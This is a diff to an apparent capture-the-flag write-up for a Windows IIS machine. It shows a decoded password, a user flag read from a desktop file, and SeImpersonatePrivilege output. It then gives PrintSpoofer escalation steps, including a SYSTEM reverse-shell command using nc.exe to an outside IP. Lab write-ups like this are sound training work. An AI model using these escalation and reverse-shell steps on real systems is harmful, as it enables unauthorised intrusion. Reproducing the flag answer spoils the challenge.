@@ -198,7 +198,7 @@ Bob - !P@$$W0rD!123
 └─$ echo "QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk" | base64 -d    
 Bill - Juw4nnaM4n420696969!$$$                        
 ```
-Tried an admin hidden shares but no username, either password wont work here on SMB shares at least.
+Tried an admin hidden shares but no username, either password wont work here on SMB shares at least. Also dont work on RDP using freeRDP or xrdp.
 Closer look with nmap using script on port 135,139,445:
 ```
 Starting Nmap 7.95 ( https://nmap.org ) at 2026-05-16 03:15 AEST
@@ -296,8 +296,10 @@ Microsoft Windows [Version 10.0.14393]
 
 c:\windows\system32\inetsrv>whoami
 iis apppool\defaultapppool
-
-c:\windows\system32\inetsrv>whoami /priv
+c:\windows\system32\inetsrv> cd \Users\Bob\Desktop
+c:\Users\Bob\Desktop>type user.txt
+THM{fdk4ka34vk346ksxfr21tg789ktf45}
+c:\Users\Bob\Desktop>whoami /priv
 
 PRIVILEGES INFORMATION
 ----------------------
@@ -312,6 +314,35 @@ SeImpersonatePrivilege        Impersonate a client after authentication Enabled
 SeCreateGlobalPrivilege       Create global objects                     Enabled 
 SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
 ```
+Answer Q1: User flag is THM{fdk4ka34vk346ksxfr21tg789ktf45}
+
+From whoami /priv it appears the SeImpersonatePrivilege is enabled and is useful for excalation:
+
+A few options here are:
+- PrintSpoofer likely to work
+- RoguePotato no time to check 
+- GodPotato no time to check
+- JuicyPotato will fail
+
+Get PrintSpoofer first
+```
+https://github.com/itm4n/PrintSpoofer/releases/tag/v1.0
+```
+Arguments:
+  -c <CMD>    Execute the command *CMD*
+  -i          Interact with the new process in the current command prompt (default is non-interactive)
+  -d <ID>     Spawn a new process on the desktop corresponding to this session *ID* (check your ID with qwinsta)
+  -h          That's me :)
+
+Examples:
+  - Run PowerShell as SYSTEM in the current console
+      PrintSpoofer.exe -i -c powershell.exe
+  - Spawn a SYSTEM command prompt on the desktop of the session 1
+      PrintSpoofer.exe -d 1 -c cmd.exe
+  - Get a SYSTEM reverse shell
+      PrintSpoofer.exe -c "c:\Temp\nc.exe 10.10.13.37 1337 -e cmd"
+
+
 
 Meterpreter results
 ```
